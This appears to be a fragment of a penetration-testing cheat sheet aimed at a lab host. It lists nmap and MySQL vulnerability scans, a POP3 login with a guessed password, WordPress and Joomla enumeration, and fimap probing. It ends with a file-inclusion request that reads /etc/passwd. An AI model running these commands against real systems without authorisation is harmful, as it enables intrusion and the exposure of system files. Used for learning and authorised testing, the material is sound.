...
nmap 10.10.10.87 -sV -sC -O -p 111,222,333
...
```
telnet 10.10.10.87 110
USER pelle@10.10.10.87
PASS admin
...
```
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse 10.10.10.87 -p 3306
...
# CMS Explorer
cms-explorer -url http://10.10.10.87 -type [Drupal, WordPress, Joomla, Mambo]

# WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)
wpscan --url http://10.10.10.87
wpscan --url http://10.10.10.87 --enumerate vp
wpscan --url http://10.10.10.87 --enumerate vt
wpscan --url http://10.10.10.87 --enumerate u

# Joomscan
joomscan -u  http://10.10.10.87 
joomscan -u  http://10.10.10.87 --enumerate-components
...
curl 10.10.10.87 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

# Look at page with just text
curl 10.10.10.87 -s -L | html2text -width '99' | uniq
...
```
fimap -u "http://10.10.10.87/example.php?test="

# Ordered output
curl -s http://10.10.10.87/gallery.php?page=/etc/passwd
